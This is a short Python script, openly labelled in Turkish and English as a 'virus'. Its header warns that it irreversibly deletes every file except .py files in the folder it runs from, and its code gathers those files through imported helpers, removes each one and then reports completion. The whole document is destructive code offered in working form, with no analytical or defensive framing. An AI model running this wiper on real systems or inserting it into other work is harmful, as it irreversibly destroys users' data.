# ----------------------------------------------------------
# UYARI: Bu virüsü kişisel bilgisayarınızda çalıştırmayın!
# Bu virüs çalıştırıldığında, içinde olduğu klasördeki
# .py uzantılı dosyalar HARİÇ her şeyi geri döndürülemez
# bir şekilde siler!
# ----------------------------------------------------------
# WARNING: Never run this virus on your personal computer!
# When this virus is run, it irreversibly deletes everything
# except .py files in the folder it is in!
# ----------------------------------------------------------

from file_utils import get_target_files, safe_remove

PROTECTED_EXTENSIONS = {".py"}


def run() -> None:
    targets = get_target_files(".", protected_extensions=PROTECTED_EXTENSIONS)
    for filepath in targets:
        safe_remove(filepath)
    print("İşlem tamamlandı!")


if __name__ == "__main__":
    run()
